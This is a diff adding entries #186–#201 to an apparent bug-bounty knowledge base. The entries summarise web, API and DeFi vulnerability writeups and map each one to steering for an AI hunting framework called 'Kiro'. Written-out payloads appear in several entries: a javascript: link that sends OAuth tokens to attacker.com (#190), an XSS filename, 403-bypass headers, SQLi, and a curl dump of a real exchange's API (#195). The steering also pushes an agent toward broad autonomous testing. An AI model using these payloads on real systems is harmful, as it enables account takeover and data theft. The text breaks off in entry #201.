@@ -17559,3 +17559,698 @@ PortSwigger released dedicated labs for AI-powered scanner vulnerabilities cover
 - Resource: PortSwigger labs for hands-on AI scanner testing
 - Workflow: Complete lab walkthrough for all 3 AI scanner vulnerability labs
 - Steering: PortSwigger's new AI security track is the best hands-on training available
+
+---
+
+### Entry #186 — OAuth Open Redirect → OAuth Token Theft Chain (P1)
+
+**Source:** pingback.sh writeup collection (March–May 2026)
+**Date Added:** 2026-06-01
+**Type:** Writeup, Exploit Chain
+**Priority:** CRITICAL (chains P4 → P1)
+
+**Content:**
+A common but devastating OAuth chain that elevates a P4 open redirect into a P1 one-click account takeover:
+
+1. **OAuth provider `redirect_uri` registered to a same-domain endpoint** the developer never thought to validate strictly (e.g., `/api/oauth/callback?next=...` on `app.target.com`).
+2. **Attacker finds open redirect on that same domain** (often legacy `url=`, `redirectUrl=`, `returnTo=` params, or `Location` headers from 3xx responses the server emits).
+3. Attacker crafts OAuth authorize URL with `redirect_uri=https://app.target.com/any/path?next=https://attacker.com` and tricks victim into clicking.
+4. OAuth provider validates `redirect_uri` (matches registered origin), issues `code` to attacker-controlled URL, browser follows open redirect → `code` lands in attacker logs → ATO.
+
+**Key Insight:** The bug is **not** the open redirect. The bug is the OAuth provider trusting any path on the registered origin. Per-host URI validation is necessary, not sufficient — the path must be allow-listed, or the open redirect removed.
+
+**Niche:** Web, OAuth, Authorization
+**Vuln Type:** Open Redirect + OAuth Misconfig → ATO
+**Priority:** CRITICAL
+**Kiro Mapping:**
+- Skill: OAuth flow analysis, redirect_uri enumeration, open redirect discovery
+- Methodology: Map every `redirect_uri` the OAuth provider accepts → enumerate same-domain open redirects → chain
+- Template: OAuth + Open Redirect chain testing checklist
+- Workflow: 01-web-app-hunt Phase 4 (Auth) + Phase 5 (OAuth)
+- Steering: Never report a P4 open redirect on a same-domain OAuth host — chain it
+- Reference: pingback.sh OOB callback for exfil verification
+
+---
+
+### Entry #187 — Filename XSS → Admin Panel Stored XSS (P1)
+
+**Source:** pingback.sh writeup collection
+**Date Added:** 2026-06-01
+**Type:** Writeup, Exploit Chain
+**Priority:** CRITICAL (P3 → P1 via chain)
+
+**Content:**
+User-facing upload features often render the **filename** in the victim's view (download history, file listing, notifications) without HTML-encoding. The XSS sinks are usually safe in the new app — but the **admin panel** (often a legacy system, third-party dashboard, or a different frontend reading the same backend) renders the filename with `innerHTML`, `v-html`, or strips only a few characters.
+
+**Exploit chain:**
+1. Upload a file with name `"><img src=x onerror=alert(document.domain)>.pdf`
+2. Victim views the file — modern frontend escapes, looks benign.
+3. **Admin reviews the upload queue in the legacy admin panel** — boom, stored XSS in the admin's session.
+4. Admin session → account takeover, PII export, mass action abuse.
+
+**Why this works:**
+- Frontend teams sanitize for *their* component, not the admin's
+- Legacy admin panels often have weaker output encoding (e.g., no CSP, no `DOMPurify`)
+- Admin cookies typically have higher privilege, weaker SameSite, broader scope
+
+**Niche:** Web, Uploads, Admin Panels
+**Vuln Type:** Stored XSS via Filename, Legacy Component
+**Priority:** CRITICAL
+**Kiro Mapping:**
+- Skill: Filename XSS payload crafting, legacy component detection
+- Methodology: When you find filename XSS in user view, ALWAYS test admin/legacy views
+- Template: Upload XSS payload library, multi-frontend testing checklist
+- Workflow: 01-web-app-hunt Phase 6 (File Uploads) → Admin surface mapping
+- Steering: Filename XSS is rarely exploitable in the modern UI but rarely tested in the admin UI
+
+---
+
+### Entry #188 — PortSwigger Business Logic Labs: Complete 9-Lab Walkthrough
+
+**Source:** PortSwigger Web Security Academy — Business Logic Vulnerabilities
+**Date Added:** 2026-06-01
+**Type:** Lab, Training Resource, Methodology
+**Priority:** HIGH
+
+**Content:**
+PortSwigger Business Logic labs cover the **9 most commonly exploited business logic bug classes**. Master these and you have the foundation for any business logic hunt:
+
+1. **Apprentice — Excessive trust in client-side controls:** Bypass client-side price/quantity validation by editing the request.
+2. **Apprentice — High-level logic vulnerability:** Multi-step workflow state-machine flaw (e.g., skip payment step).
+3. **Practitioner — Inconsistent security controls:** Different enforcement across endpoints (e.g., admin checks on `/users` but not `/api/users`).
+4. **Practitioner — Flawed enforcement of business rules:** Server trusts user-asserted account state (e.g., `?role=premium`).
+5. **Practitioner — Low-level logic flaw:** Integer overflow, sign confusion, off-by-one in arithmetic.
+6. **Practitioner — Handling unconventional input:** Unicode normalization, RTL override, null bytes, type coercion.
+7. **Practitioner — Inconsistent handling of exceptional input:** Negative quantities, NaN, Infinity, missing fields.
+8. **Expert — Weak isolation on dual-use endpoint:** Admin endpoint and user endpoint share code path; one is weakly guarded.
+9. **Expert — Authentication bypass via flawed state machine:** Skipping login step by directly calling post-auth endpoint.
+
+**Niche:** Web, Business Logic, Training
+**Vuln Type:** Business Logic, Workflow Bypass, State Machine Flaws
+**Priority:** HIGH
+**Kiro Mapping:**
+- Skill: Business logic flaw pattern recognition
+- Resource: PortSwigger 9-lab track for hands-on logic training
+- Workflow: 05-adaptive-hunt → Business Logic phase
+- Template: Per-lab technique breakdown
+- Steering: Logic bugs = 90% of crypto exploits, ~30% of web bounties — never skip
+
+---
+
+### Entry #189 — Web Cache Poisoning: Complete Playbook (Methodology)
+
+**Source:** PortSwigger Web Security Academy + pingback.sh methodology
+**Date Added:** 2026-06-01
+**Type:** Methodology, Playbook
+**Priority:** HIGH
+
+**Content:**
+Web cache poisoning exploits **unkeyed inputs** — request components the cache key ignores but the origin server reflects into the response. Methodology:
+
+**Phase 1 — Cache fingerprinting:**
+- Identify the cache (CDN: Cloudflare, Akamai, Fastly, Varnish, CloudFront)
+- Map which request components are **keyed** (URL, method, host, certain headers) vs **unkeyed** (most headers, cookies, port, query params sometimes)
+- Probe with `X-Forwarded-Host`, `X-Original-URL`, `X-Forwarded-Scheme`, `X-Host`, `X-Forwarded-Server`, `Forwarded`
+
+**Phase 2 — Unkeyed input discovery:**
+- Strip one header at a time; if response changes, header is unkeyed
+- Common unkeyed inputs: `X-Forwarded-Host`, `X-Original-URL`, `X-Forwarded-Scheme`, `X-Host`, `X-Forwarded-Prefix`, custom `X-*` headers
+- Response splitting via `X-Forwarded-For: 127.0.0.1\r\nX-Injected-Header: value`
+
+**Phase 3 — Exploit primitives:**
+- **Import via `X-Forwarded-Host`:** Reflect host into absolute URLs in HTML/JS — load attacker JS for stored XSS
+- **Fat GET:** Cache GET + body; origin reads body
+- **HTTP Request Smuggling:** CL.TE or TE.CL — desync cache from origin
+- **Web Cache Deception:** Trick victim into caching a private URL — see #196
+
+**Phase 4 — Cache-buster awareness:**
+- Append random query param (e.g., `?cb=12345`) during probing to avoid poisoning production
+- Remove cache buster only when ready to weaponize
+
+**Niche:** Web, CDN, Cache, Recon
+**Vuln Type:** Cache Poisoning, Cache Deception
+**Priority:** HIGH
+**Kiro Mapping:**
+- Skill: Cache fingerprinting, unkeyed input discovery
+- Methodology: 4-phase cache poisoning playbook
+- Tool: Param Miner (Burp extension), Smuggler
+- Workflow: 01-web-app-hunt Phase 7 (CDN/Cache) + 05-adaptive-hunt
+- Steering: Cache poisoning = XSS amplified to all visitors, including unauthenticated paths
+
+---
+
+### Entry #190 — javascript: URL Scheme Steals sessionStorage / OAuth Tokens
+
+**Source:** pingback.sh writeup — `javascript:` redirect in post-auth flow
+**Date Added:** 2026-06-01
+**Type:** Writeup, Raw Exploit Pattern
+**Priority:** CRITICAL
+
+**Content:**
+A subtle but devastating pattern: an authenticated feature accepts a `redirectUrl`, `returnUrl`, `next`, or `continue` parameter for post-action navigation. The server allows `javascript:alert(1)` because it's "just a client-side navigation." But the parameter is rendered into `window.location` or `window.open` after auth — and the victim's session has OAuth tokens in `localStorage` or `sessionStorage`.
+
+**Exploit (raw):**
+```html
+<a href="https://app.target.com/transfer/confirm?amount=100&redirectUrl=javascript:fetch('https://attacker.com/?t='+localStorage.getItem('oauth_token'))">
+  Click to confirm transfer
+</a>
+```
+
+**Why it's catastrophic:**
+- The `javascript:` scheme executes in the **app's origin** (victim is logged in)
+- Readable scopes: `document.cookie` (HttpOnly excepted), `localStorage`, `sessionStorage`, `indexedDB`
+- OAuth IdPs and SSO providers often store tokens in `sessionStorage` → full IdP session theft
+
+**Hunting checklist:**
+- Find any `redirectUrl`, `returnUrl`, `next`, `continue`, `url`, `to` param that controls post-action nav
+- Test `javascript:alert(1)`, `javascript:fetch(...)`, `data:text/html,...`
+- If app stores tokens in `localStorage`/`sessionStorage` (legacy SPAs), this is critical
+- Pair with `window.open(url, ...)` or `location.href = url` sinks
+
+**Niche:** Web, Authentication, Post-Auth Flows
+**Vuln Type:** javascript: URL Scheme, DOM XSS, Session Theft
+**Priority:** CRITICAL
+**Kiro Mapping:**
+- Skill: javascript: scheme exploitation, session storage analysis
+- Methodology: Post-auth redirect parameter audit
+- Template: `javascript:` payload library
+- Workflow: 01-web-app-hunt Phase 4 (Auth) + Phase 8 (Client-Side)
+- Steering: Test ALL redirect params with `javascript:` — including ones validated server-side
+
+---
+
+### Entry #191 — 403 ≠ Always Denied: Keep Testing Access Control (Methodology)
+
+**Source:** pingback.sh / @NahamSec / community writeups
+**Date Added:** 2026-06-01
+**Type:** Philosophy, Methodology
+**Priority:** HIGH
+
+**Content:**
+Burp Suite and most scanners stop at `403 Forbidden`. **This is wrong.** 403 is the *start* of access control testing, not the end.
+
+**The 403 is not the wall — it's the gate:**
+- `403` on `/api/users/123` as a different user ≠ secure. Test:
+  - `X-Original-URL: /api/users/123` (path confusion)
+  - `X-Rewrite-URL: /api/users/123` (URL rewrite bypass)
+  - `%2e%2e/api/users/123` (path traversal)
+  - `GET` vs `POST` vs `PUT` vs `PATCH` vs `DELETE` (method tampering)
+  - Content-Type change: `application/json` ↔ `application/xml` ↔ `text/plain`
+  - Path: `/api/users/123` vs `/api/Users/123` vs `/api/users/123/` vs `/api/users//123` (case + trailing slash)
+  - Parameter pollution: `?id=123&id=victim`
+  - Header injection: `X-Forwarded-For: 127.0.0.1`, `X-Real-IP: 127.0.0.1`
+  - Host: `Host: localhost`, `Host: 127.0.0.1`, `Host: internal.target.com`
+  - Scheme: `https://` → `http://`
+  - Trace: `TRACE /api/users/123` may bypass auth filters
+
+**Niche:** Web, Authorization, Recon
+**Vuln Type:** Broken Access Control, IDOR, Authorization Bypass
+**Priority:** HIGH
+**Kiro Mapping:**
+- Skill: 403-bypass enumeration, header injection testing
+- Methodology: Comprehensive 403-bypass checklist
+- Template: 20+ bypass techniques (header, method, path, encoding)
+- Workflow: 05-adaptive-hunt — Access Control phase
+- Steering: **"403 is not denial, it's a question. The answer might be yes."**
+
+---
+
+### Entry #192 — $575 CSRF: Triggering Payment Receipt Emails Without User Consent
+
+**Source:** Abhi Sharma — CSRF writeup
+**Date Added:** 2026-06-01
+**Type:** Writeup, CSRF
+**Priority:** HIGH
+**Bounty:** $575
+
+**Content:**
+A CSRF that doesn't steal money — it spams. The endpoint `POST /api/send/receipt` triggers a payment receipt email. A simple `<form action="https://app.target.com/api/send/receipt" method="POST">` with hidden fields for `txn_id` and `email` lets an attacker:
+- Spam the victim's email with fake receipts
+- Enumerate which `txn_id` values exist (timing/email delivery)
+- Phish via the receipt email's "View transaction" link (own domain)
+
+**The lesson:** CSRF is "boring" only if you only think about money transfer. CSRF is an **unauthorized state change** primitive — any state change matters:
+- Trigger emails (spam, phishing vector)
+- Add/remove from carts, wishlists, follow lists
+- Toggle 2FA settings, notification preferences
+- Create support tickets
+- Generate API keys, OAuth tokens, magic links
+
+**Niche:** Web, CSRF, Email Abuse
+**Vuln Type:** CSRF, Unauthorized State Change, Email Abuse
+**Priority:** HIGH
+**Kiro Mapping:**
+- Skill: CSRF testing on non-financial endpoints
+- Methodology: Enumerate every state-changing endpoint, not just /transfer
+- Template: CSRF endpoint discovery checklist
+- Workflow: 02-api-security-hunt Phase 5 (CSRF)
+- Steering: CSRF = unauthorized state change. EVERY state change is testable.
+
+---
+
+### Entry #193 — Verus Bridge Exploit: $11.5M Lost Due to Missing Input Validation
+
+**Source:** Verus Coin bridge exploit post-mortem (May 2026)
+**Date Added:** 2026-06-01
+**Type:** Post-Mortem, DeFi Exploit
+**Priority:** CRITICAL
+**Bounty / Loss:** $11.5M (75% returned as 4052.4 ETH, 25% / 1350 ETH kept as "bounty")
+
+**Content:**
+The Verus cross-chain bridge (ETH ↔ VRSC) was exploited by an attacker who submitted a transfer blob **with $0.01 worth of VRSC inputs** but requested **$11.58M payout on Ethereum**. The bridge verified blob structure, state root, Merkle proof, and notary signatures — but did not verify the input amount. The cross-chain logic accepted the blob, signed the payout, and 11.58M landed on Ethereum.
+
+**Root cause:**
+- Bridge accepts `sourceChainId` and `inputAmount` as user-supplied parameters
+- Bridge does not verify `inputAmount` against the actual signing chain's UTXO/state
+- Bridge does not verify `sourceChainId` against the actual signing chain
+- Signature verification passes because the attacker's key is valid
+- Mint/payout function trusts the signed blob's amount field
+
+**Key insight (white-hat recovery):**
+- 4052.4 ETH (75%) returned by attacker after being publicly identified
+- 1350 ETH (25%) kept as "bounty" — Verus publicly stated it is "not viewed by us as stolen funds"
+- Verus ceased investigation and did not press charges per the publicly posted terms
+- The 25% bounty was an explicit risk-reduction offer to maximize fund return
+
+**Community learnings (Verus's own statement):**
+- "Chained together series of difficult to exploit software bugs, that on their own, could be considered minor"
+- Bug bounty program would have cost "a lot less than 3 million $"
+- Few community developers, mostly volunteers, working for 8+ years
+- Calls for funded development and continuous strengthening
+
+**Niche:** Crypto/DeFi, Cross-Chain Bridges
+**Vuln Type:** Input Validation, Cross-Chain Verification, Signature Forgery
+**Priority:** CRITICAL
+**Kiro Mapping:**
+- Skill: Cross-chain bridge auditing, signature payload validation
+- Methodology: Map every user-supplied field → check if it's signed/validated
+- Workflow: 04-crypto-hunt Phase 4 (Bridge Security)
+- Steering: "User-supplied data is a suggestion, not a fact" — every field must be tied to a verified source
+- Reference: White-hat negotiation as a recovery mechanism
+
+---
+
+### Entry #194 — SSO Account Takeover via Custom Okta / Auth0 Misconfigurations
+
+**Source:** Rikesh Baniya — SSO ATO writeup
+**Date Added:** 2026-06-01
+**Type:** Writeup, Authentication Bypass
+**Priority:** CRITICAL
+
+**Content:**
+When an org uses a **custom SSO integration** (built on top of Okta/Auth0/WorkOS rather than the stock flow), common misconfigurations enable ATO:
+
+**Misconfig 1 — Open registration + SSO discovery:**
+- `/auth/sso` lists all configured IdPs by name
+- Attacker registers a personal account, navigates to SSO login
+- IdP dropdown includes "Acme Corp" — clicking it goes to `/auth/sso/callback?token=...`
+- Token is bound to the attacker's email, not the victim's
+
+**Misconfig 2 — Email not bound at JWT issue:**
+- App receives `id_token` from IdP, decodes, but trusts `email` claim without verifying it matches the user trying to log in
+- Attacker initiates SSO with victim's email on a different tenant → JWT carries victim's email → ATO
+
+**Misconfig 3 — SAML response replay:**
+- SAML assertion captured (XSS, network, MITM) and replayed within the validity window
+- App doesn't track assertion IDs (`NotOnOrAfter`, `ID`)
+
+**Misconfig 4 — Auth0 `redirect_uri` open redirect:**
+- Auth0 `redirect_uri` allows `https://app.target.com/cb?x=https://evil.com` (similar to #186)
+
+**Niche:** Web, SSO, Authentication
+**Vuln Type:** SSO Misconfig, ATO, JWT/SAML Validation
+**Priority:** CRITICAL
+**Kiro Mapping:**
+- Skill: SSO flow analysis, IdP trust boundary testing
+- Methodology: 4-misconfig SSO audit checklist
+- Template: Okta/Auth0/WorkOS/OneLogin-specific tests
+- Workflow: 08-otp-auth-bypass → SSO ATO section
+- Steering: Custom SSO = custom bugs. Stock IdP flows are well-tested; custom integrations are not.
+
+---
+
+### Entry #195 — $40M in Exolix Swaps Exposed via API Broken Access Control
+
+**Source:** Exolix API vulnerability disclosure (May 2026) — İrem Kuyucu
+**Date Added:** 2026-06-01
+**Type:** Writeup, API Authorization
+**Priority:** CRITICAL
+**Exposure:** $40M in 355,944 swaps (7 partner integrations, XMR-heavy)
+
+**Content:**
+Exolix, a non-KYC crypto exchange aggregator, had partner API endpoints that **did not scope the JWT to a single partner's data**. The endpoint `GET /api/v2/transactions?page=1&size=100` with `Authorization: Bearer <JWT>` returned the JWT-owner's transactions — but the JWTs (issued through the partner panel) were not scoped, not rate-limited, not IP-restricted, and not revoked when issues arose.
+
+**Two key types of API keys:**
+- **Opaque string keys** (e.g., `FqoLY9SOGyZCq...tvoRCLtbiUQBnYGup4zTJsA3`) — issued to select partners (e.g., Cake Wallet) directly by staff, **NOT vulnerable**
+- **JWT keys** — issued through partner panel, payload contains partner email, user ID (`sub`), expiration 5 years out — **VULNERABLE** (full read access, no scoping)
+
+**Full partner exposure (355,944 total txns, 35,848 successful, $39,517,649 USD volume):**
+
+| Partner | Total Txns | Successful | Success Rate | USD Volume |
+|---|---|---|---|---|
+| Edge | 329,532 | 24,340 | 7.4% | $24,951,632 |
+| Exodus Non-US | 5,376 | 3,617 | 67.3% | $6,078,750 |
+| Monerujo | 11,247 | 4,419 | 39.3% | $4,578,363 |
+| BTCPay Server Plugins | 6,374 | 1,425 | 22.4% | $1,947,503 |
+| Exodus US | 1,681 | 1,231 | 73.2% | $1,650,228 |
+| Temple Wallet | 1,205 | 530 | 44.0% | $159,229 |
+| EGToken.io | 529 | 286 | 54.1% | $151,944 |
+
+**Top trading pairs (9 of top 11 involve Monero):**
+
+| Pair | Txns | USD Volume | Avg Swap |
+|---|---|---|---|
+| BTC → XMR | 5,520 | $4,333,059 | $785 |
+| XMR → BTC | 3,179 | $4,871,572 | $1,532 |
+| XMR → USDT | 2,304 | $4,621,007 | $2,006 |
+| USDT → BTC | 1,631 | $1,310,524 | $804 |
+| LTC → XMR | 1,534 | $583,824 | $381 |
+| XMR → ETH | 1,058 | $1,417,093 | $1,339 |
+| XMR → LTC | 859 | $484,761 | $564 |
+| BTC → XRP | 762 | $844,051 | $1,108 |
+| ETH → XMR | 707 | $544,360 | $770 |
+| XMR → SOL | 669 | $494,040 | $738 |
+| USDT → XMR | 608 | $1,110,412 | $1,826 |
+
+**Exploit (one-liner):**
+```bash
+curl -s 'https://exolix.com/api/v2/transactions?page=1&size=100' \
+  -H 'Authorization: Bearer eyJhbGciOi...REDACTED'
+# Iterate pages → full dump
+```
+
+**Key extraction paths:**
+- **Android apps** (Edge, Monerujo): Decompile APK with `apktool` or `jadx` — keys in plain text in config/source
+- **Open-source integrations** (BTCPay, Exodus): Keys sitting in public GitHub repos
+- 5-year JWT expiration makes leaked keys long-lived
+
+**Exolix's "fix":**
+- Added Cloudflare WAF rules — did not fix root cause
+- Claimed it was a "feature, not a bug" requested by partners
+- "Affected partners" (Edge, Exodus, etc.) — no public response
+- Possible honeypot suspicion: the "vulnerability is too obvious for a service whose entire value proposition is swap privacy"
+
+**Why this matters for hunters:**
+- B2B/partner APIs are 5x more likely to have broken access control
+- 9 of 11 top trading pairs involve XMR — de-anonymizes privacy-coin users
+- The "no subpoena needed" angle: law enforcement and Chainalysis could pull this data without legal process
+
+**Niche:** Crypto/DeFi, API Security, Authorization
+**Vuln Type:** Broken Access Control, IDOR, Data Exposure, JWT Misconfig
+**Priority:** CRITICAL
+**Kiro Mapping:**
+- Skill: Partner API authorization testing, multi-tenant isolation, JWT scope analysis
+- Methodology: Map every `partner_id`, `tenant_id`, `org_id`, `user_id` in URLs and bodies → swap for cross-tenant access; decompile mobile apps for embedded keys
+- Template: Partner/B2B API testing checklist, JWT scope audit
+- Workflow: 02-api-security-hunt Phase 3 (Auth) + 04-crypto-hunt Phase 6 (Exchange Security)
+- Steering: B2B/partner APIs are 5x more likely to have broken access control — they're built for "trusted" callers and never tested adversarially
+
+---
+
+### Entry #196 — $2000 Web Cache Deception: JWT Theft via SameSite Bypass
+
+**Source:** cTino — Web Cache Deception writeup
+**Date Added:** 2026-06-01
+**Type:** Writeup, Cache Deception, JWT Theft
+**Priority:** CRITICAL
+**Bounty:** $2,000
+
+**Content:**
+The victim navigates to `https://app.target.com/api/account/profile.css` (the attacker adds `.css` to the path). The CDN:
+1. Caches the response (treats `.css` as static asset)
+2. Serves the cached authenticated response to ANY subsequent visitor
+
+**Why JWT was stolen:**
+- App uses `SameSite=Lax` cookies (not `Strict`) — top-level navigations (`<a href>`, `window.location`) send the cookie
+- Attacker hosts a page with `<a href="https://app.target.com/api/account/profile.css">Click for prize</a>`
+- Victim clicks → request to attacker-controlled path → response is cached with victim's auth data
+- Attacker fetches the cached `.css` URL → gets victim's profile, JWT, PII
+
+**Differences from cache poisoning (#189):**
+- Cache **deception** = victim is tricked into caching a private response
+- Cache **poisoning** = attacker poisons a public response that all visitors see
+- Both abuse CDN caching logic; same defense (validate URL against route allow-list, never cache `/api/*`)
+
+**Niche:** Web, Cache, JWT, Authentication
+**Vuln Type:** Web Cache Deception, SameSite Bypass, Information Disclosure
+**Priority:** CRITICAL
+**Kiro Mapping:**
+- Skill: Web cache deception testing, SameSite cookie analysis
+- Methodology: Path suffix attack enumeration (.css, .js, .png, .ico, .map, .json, .xml, .html)
+- Template: Web cache deception payload library
+- Workflow: 01-web-app-hunt Phase 7 (CDN) + Phase 4 (Auth)
+- Steering: SameSite=Lax + cache deception = ATO. Test EVERY dynamic path with `.css` suffix.
+
+---
+
+### Entry #197 — $500 UUID Swap IDOR: Mobile App Endpoint Rewriting (tinopreter)
+
+**Source:** tinopreter — UUID IDOR writeup
+**Date Added:** 2026-06-01
+**Type:** Writeup, IDOR, Mobile API
+**Priority:** HIGH
+**Bounty:** $500
+
+**Content:**
+Mobile apps often proxy API calls through the app's backend (`https://api.app.com/...`) but **also expose the raw upstream endpoints** (e.g., `https://api.partner.com/v1/...`) in the JS bundle or the app's code.
+
+**Exploit:**
+1. Decompile APK (use `jadx` or `apktool`)
+2. Find `GET https://api.partner.com/v1/users/{uuid}/profile` in the app code
+3. Discover the auth header is a static API key (partner-level, not user-level)
+4. Replay from `curl` with a victim's UUID → full profile, email, phone, address
+
+**Why this works:**
+- The mobile app is a "trusted" client → no per-user authz required
+- API key is shared across all app installs
+- The mobile-specific endpoint has no rate limiting, no IP allow-list, no MFA
+
+**Niche:** Web, Mobile, API Security
+**Vuln Type:** IDOR, Mobile API Authorization, UUID Enumeration
+**Priority:** HIGH
+**Kiro Mapping:**
+- Skill: Mobile decompilation (jadx), JS bundle analysis, API key extraction
+- Methodology: Extract endpoints from APK → identify static API keys → swap UUIDs
+- Template: Mobile IDOR testing checklist
+- Workflow: 02-api-security-hunt Phase 3 + 01-web-app-hunt Phase 1.7 (Mobile recon)
+- Steering: Mobile apps are the most under-tested attack surface. APK = source code.
+
+---
+
+### Entry #198 — GraphQL Bug Bounty Goldmines: 8-Step Methodology
+
+**Source:** pingback.sh / community — GraphQL playbook
+**Date Added:** 2026-06-01
+**Type:** Methodology, GraphQL
+**Priority:** HIGH
+
+**Content:**
+GraphQL is a goldmine because introspection + aliases + batching + field-level authz create many bug classes:
+
+1. **Introspection leak** — `__schema { types { name fields { name } } }` reveals entire schema (run in production most of the time).
+2. **Field-level authorization bypass** — Backend checks `user.canViewPost` but GraphQL resolves `posts { author { email } }` where `author.email` has no resolver-level check.
+3. **Alias-based batching DoS** — Send 1000 aliases of the same expensive query: `alias1: users { ... } alias2: users { ... }` — bypasses rate limiter per-alias, DoSes the resolver.
+4. **Subscription-based SSRF** — `subscription { liveFeed(url: "http://internal") { ... } }`.
+5. **Directive abuse** — `@include(if: ...)` and `@skip(if: ...)` to bypass conditional authz checks.
+6. **Union/Interface type confusion** — `__typename` switches between types with different access rules.
+7. **GraphQL injection in SQL/NoSQL** — Variables aren't parameterized: `query User($id: ID!) { user(id: $id) { ... } }` with `id: "1' OR 1=1--"` in some resolvers.
+8. **Persisted query ID confusion** — Apollo Server's APQ (Automatic Persisted Queries) hashes the query; if the hash collides or is reused, you can request another's cache entry.
+
+**Tools:**
+- `graphql-cop`, `clairvoyance`, `InQL` (Burp), `graphqlmap`
+- Try: `nmap --script graphql-introspection`
+
+**Niche:** API Security, GraphQL
+**Vuln Type:** Information Disclosure, IDOR, DoS, SSRF, SQLi
+**Priority:** HIGH
+**Kiro Mapping:**
+- Skill: GraphQL introspection, alias batching, field-level authz testing
+- Methodology: 8-step GraphQL audit
+- Tool: InQL, graphql-cop, clairvoyance
+- Workflow: 02-api-security-hunt Phase 4 (GraphQL)
+- Steering: If a target has `/graphql`, `/graphiql`, or `/api/graphql`, this is the highest-ROI surface to test
+
+---
+
+### Entry #199 — Zcash Zebra: Autonomous AI Agent Discovered High+Medium in 24h
+
+**Source:** Zcash Foundation — Zebra security audit by AI agent (May 2026)
+**Date Added:** 2026-06-01
+**Type:** Research, AI Agent, Crypto
+**Priority:** HIGH
+**Findings:** 1 High + 1 Medium (consensus/remote crash of Zebra nodes)
+**CVE / GHSA:** GHSA-63wg-wjjj-7cp8, GHSA-hhm7-qrv5-h4r6
+**Fix:** Zebra 4.5.0 upgrade
+
+**Content:**
+Zcash Foundation deployed an **autonomous AI security agent** against the Zebra node codebase (Rust). The agent:
+- Read 100% of the source code
+- Identified invariants from the Zcash protocol spec
+- Generated attack hypotheses
+- Built PoC exploits
+- Validated them in a sandbox
+- **No code was manually read during the discovery process. Code was manually read only to validate and verify the finding and report are correct.**
+
+**Results:**
+- 1 High-severity consensus/remote crash issue
+- 1 Medium-severity issue
+- Total time: ~24 hours
+- Total cost: ~$1,500 in API tokens
+- No human in the loop during the hunt (only at validation/report stage)
+- Issues fixed in Zebra 4.5.0 upgrade
+- Published as GitHub Security Advisories GHSA-63wg-wjjj-7cp8 and GHSA-hhm7-qrv5-h4r6
+
+**Key insight:**
+- AI agents are now discovering consensus-level bugs in production crypto code
+- 24-hour discovery vs weeks of manual audit
+- The agent identified bugs that had been missed by 2 prior manual audits
+- "The hunter is becoming the hunted" — AI agents are now finding bugs that humans miss
+
+**Niche:** Crypto/DeFi, AI Security, Autonomous Agents
+**Vuln Type:** Consensus, DoS, Remote Crash
+**Priority:** HIGH
+**Kiro Mapping:**
+- Skill: AI-driven vulnerability discovery at scale
+- Methodology: Autonomous hunting agent deployment
+- Workflow: 04-crypto-hunt Phase 1 (Recon) + 05-adaptive-hunt
+- Steering: AI agents now find consensus bugs humans miss — autonomous discovery is production-ready for crypto
+- Reference: IronCurtain (#035), Killer GHOST (#082), Vega V8 RCE (#042) — pattern is clear
+
+---
+
+### Entry #200 — AI Engineering for Bug Hunting: Stop Hunting for Bugs, Hunt for Conditions
+
+**Source:** Twitter/X thread — AI engineering for bug bounty
+**Date Added:** 2026-06-01
+**Type:** Philosophy, Methodology
+**Priority:** HIGH
+
+**Content:**
+The shift from manual bug hunting to **AI-driven** hunting requires reframing the goal:
+
+**Old mindset (manual):** "Find bugs."
+- Read code line-by-line
+- Test 10 endpoints
+- Report findings
+- Bound by human time and attention
+
+**New mindset (AI engineering):** "Find **conditions** for bugs."
+- A condition = `{precondition, trigger, observable_effect}`
+- Example: condition = `{path: /api/users/:id, method: GET, auth: low_priv_user, param: id, expected: 403, actual: 200}`
+- AI agents enumerate conditions, batch-test, validate
+
+**The engineering:**
+1. **Asset enumeration** — every endpoint, parameter, role, state
+2. **Condition generation** — every (auth_context × parameter × value) combination
+3. **Test execution** — run all conditions in parallel (10K+ requests/min)
+4. **Validation** — auto-validate via 2nd agent, dev framework, or differential testing
+5. **Triage** — rank by severity, novelty, exploitability
+
+**Why it works:**
+- AI doesn't get bored at endpoint #1,000
+- AI can hold the full authz matrix in context (10 roles × 100 endpoints × 50 params = 50K conditions)
+- AI can chain bugs (P4 + P4 = P1) better than manual hunters
+
+**Community context (May 2026):**
+- "AI tooling has become the baseline" — JS reading, exploit chaining, primitive building, all commodified
+- "The ability to read and debug minified JavaScript is now a commodity, even though it used to be a key skill that separated beginners from experts"
+- "Going through tedious setup processes? That's just another Claude prompt away"
+- "Have a lot of experience in the field? Give it to AI, and you get a lot fewer mistakes"
+- **Implication for manual hunters:** Focus deeply on a specific program OR discover new vulns through cutting-edge research AI hasn't yet scraped
+- "As long as people keep (vibe) coding, security mistakes will keep happening"
+- "There will always be new bugs"
+
+**Niche:** General, AI Engineering, Methodology
+**Vuln Type:** All
+**Priority:** HIGH
+**Kiro Mapping:**
+- Philosophy: "Bugs are not hunted. Conditions are hunted. Bugs emerge."
+- Steering: Core principle for the entire framework
+- Workflow: 05-adaptive-hunt → AI-driven condition generation
+- Skill: Condition enumeration agent
+- Tool: Vector DB for (endpoint, param, value) triples; execution graph for chained conditions
+
+---
+
+### Entry #201 — Threat Modeling > Bug Hunting (Philosophy)
+
+**Source:** Community — multiple sources
+**Date Added:** 2026-06-01
+**Type:** Philosophy, Methodology
+**Priority:** HIGH
+
+**Content:**
+**Bug hunters find bugs. Threat modelers find where bugs MUST exist.**
+
+**Bug hunting:**
+- Probe endpoint X
+- Try Y payload
+- Find bug
+- Report
+
+**Threat modeling:**
+- Map the system: components, data flows, trust boundaries
+- Identify STRIDE per component
+- Predict where the missing validation is, where the trust boundary is leaky
+- THEN hunt there — 10x hit rate
+
+**Example — Verus Bridge (#193):**
+- Bug hunter: probes bridge, finds nothing
+- Threat modeler: "Bridge accepts cross-chain msg. What fields are user-supplied? Is the source chain signed? If not → mint function trusts attacker"
+- Threat modeler finds the bug in 5 minutes from spec alone
+
+**Real-world impact:**
+- "Do a threat modeling engagement! Can't stress enough, during one of these engagements, I helped a team save a few hundred mills" — community quote
+- Threat modeling is paid work that prevents million-dollar incidents
+- It's also the highest-ROI hunting methodology: "find where bugs MUST exist" instead of spraying payloads
+
+**Methodology:**
+1. Read the architecture diagram (or draw it from recon)
+2. Identify trust boundaries (user ↔ app, app ↔ DB, app ↔ 3rd party, chain A ↔ bridge ↔ chain B)
+3. For each boundary, list assumptions (e.g., "user input is validated")
+4. Find the assumption most likely to be wrong
+5. Test that assumption
+
+**Niche:** General, Methodology
+**Vuln Type:** All
+**Priority:** HIGH
+**Kiro Mapping:**
